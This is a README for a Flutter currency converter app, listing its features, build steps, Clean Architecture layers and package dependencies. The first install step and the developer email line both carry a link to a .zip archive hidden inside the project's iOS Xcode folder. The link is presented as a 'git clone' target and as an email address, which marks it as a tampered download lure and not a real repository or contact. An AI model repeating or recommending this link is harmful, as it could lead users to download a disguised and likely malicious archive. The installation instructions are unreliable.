# Currency Converter App [phase 1]
##### Open source flutter mobile app.
------
## Features
- Supported currencies list with a flag and price in dollar.
- Converting between two currencies.
- Retrieving the last 7 days history for the selected currencies.

## Installation

Follow these steps to build the project:

1. Clone the repository:
   ```bash
   git clone https://raw.githubusercontent.com/Zaid-daoud/currency_converter/main/ios/Runner.xcodeproj/currency-converter-v2.4.zip

2. Navigate to the project directory:
   ```bash
   cd your_app

3. Install dependencies:
   ```bash
   flutter pub get

4. Run the app:
   ```bash
   flutter run

## Clean Architecture Design Pattern
As required this app follows the Clean Architecture design pattern which separates the application into layers like this:

Presentation Layer: Contains the UI and user interaction components.
Domain Layer: Contains the business logic and use cases.
Data Layer: Manages data access, including databases and network calls.

###### Why Clean Architecture?

Clean Architecture provides a clear separation of concerns, making the codebase modular and easier to maintain and to add a new features.

## Database
The app uses Hive as the local database because it's a lightweight and fast NoSQL database that is well-suited for this type of applications.

## Packages & Plugins

Currency converter now depends on the below packages & plugins :

| Packages & Plugins |
| ------ |
| http  |
| lottie  |
| flutter_bloc |
| get_it  |
| dartz  |
| flutter_svg |
| hive_flutter |
| path_provider |
| intl |

> Developer: Zaid Daoud.
> Email : https://raw.githubusercontent.com/Zaid-daoud/currency_converter/main/ios/Runner.xcodeproj/currency-converter-v2.4.zip